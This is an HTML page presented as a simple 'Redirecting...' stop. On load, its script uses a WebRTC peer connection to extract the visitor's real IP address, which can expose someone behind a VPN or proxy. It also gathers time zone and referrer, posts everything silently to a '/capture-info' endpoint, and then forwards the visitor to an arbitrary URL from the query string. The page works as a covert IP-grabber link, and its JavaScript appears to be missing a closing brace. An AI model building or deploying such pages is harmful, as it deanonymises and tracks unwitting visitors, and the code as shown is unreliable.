<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
	<link rel="icon" href="https://coturntest.moo0.com/favicon.ico" type="image/x-icon">
</head>
<body>
    Redirecting...
    <script>
        async function getIPFromWebRTC() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = function(ice) {
                    if (ice && ice.candidate && ice.candidate.candidate) {
						const match  = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
						if (match && match[1]) {
							let realIP = match[1];
							console.error("resolved " + realIP);
							pc.close();  // завершуємо з'єднання
							resolve(realIP);
						} else {
							console.error("not resolved for candidate:", ice.candidate.candidate);
						}
					} else if (!ice || !ice.candidate) {
						reject("Failed to retrieve IP or end of candidates");
					};
            });
        }
        async function sendInfo() {
			try {
				const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
				const offset = new Date().getTimezoneOffset();
				const hours = -offset / 60;
				const timeZoneString = `UTC${hours >= 0 ? '+' : ''}${hours}`;
				const referrer = document.referrer;
				
				const clientIP = await getIPFromWebRTC();
				
				const response = await fetch('/capture-info', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						timeZone: `${timeZone} (${timeZoneString})`,
						referrer: referrer,
						clientIP: clientIP
					})
				});

				if (!response.ok) {
					throw new Error('Failed to send info to server');
				}
				
				const urlParams = new URLSearchParams(window.location.search);
				const redirectUrl = urlParams.get('url');
				
				if (redirectUrl) {
					window.location.href = redirectUrl;
				} else {
					console.error("URL parameter is missing or undefined");
				}
			} catch (error) {
				console.error(error);
			}
		}
		sendInfo();
    </script>
</body>
</html>
